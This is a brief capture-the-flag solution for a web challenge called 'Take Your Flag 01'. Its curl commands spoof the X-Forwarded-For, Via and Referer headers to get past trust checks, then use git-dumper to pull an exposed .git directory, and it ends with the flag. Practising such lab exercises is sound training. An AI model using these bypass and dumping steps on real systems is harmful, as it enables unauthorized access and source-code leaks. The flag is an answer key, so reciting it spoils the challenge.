# Take Your Flag 01

## solve

```bash
curl -X POST http://110.42.112.160:35184/api/challenge/handshake -d "codename=JOKER"
curl http://110.42.112.160:35184/api/challenge/trust -H "X-Forwarded-For: 127.0.0.1"
curl http://110.42.112.160:35184/api/challenge/trust -H "Via: phantom-proxy"
curl http://110.42.112.160:35184/api/challenge/trust -H "Referer: https://mementos.local/"
git-dumper http://110.42.112.160:35184/medjed/.git/ dump
git -C dump log -p
```

flag: `flag{w3lc0me_t0_The_ph4nt0m_th13v35}`
